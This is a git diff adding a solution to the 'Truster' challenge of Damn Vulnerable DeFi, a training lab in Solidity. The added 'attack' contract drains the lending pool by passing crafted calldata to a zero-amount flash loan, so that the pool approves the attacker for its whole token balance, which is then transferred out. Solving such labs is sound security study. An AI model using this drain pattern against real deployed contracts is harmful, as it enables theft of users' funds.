@@ -6,6 +6,28 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract attack {
+    address recovery;
+    DamnValuableToken token;
+    TrusterLenderPool pool;
+
+    constructor(address _recovery, DamnValuableToken _token, TrusterLenderPool _pool) {
+        recovery = _recovery;
+        token = _token;
+        pool = _pool;
+        uint256 TOKENS_IN_POOL = 1_000_000e18;
+
+        bytes memory approveFunction = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            TOKENS_IN_POOL
+        );
+
+        pool.flashLoan(0, address(this), address(token), approveFunction);
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);        
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,7 +73,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // 1. Craft msg.data to call the approve function on the erc20 contract with my address
+        // 2. call the function with 0 amount
+        // 3. call constructor of another contract with these fields to get 1 transaction only
+        new attack(recovery, token, pool);
     }
 
     /**
@@ -66,3 +91,4 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
+ 
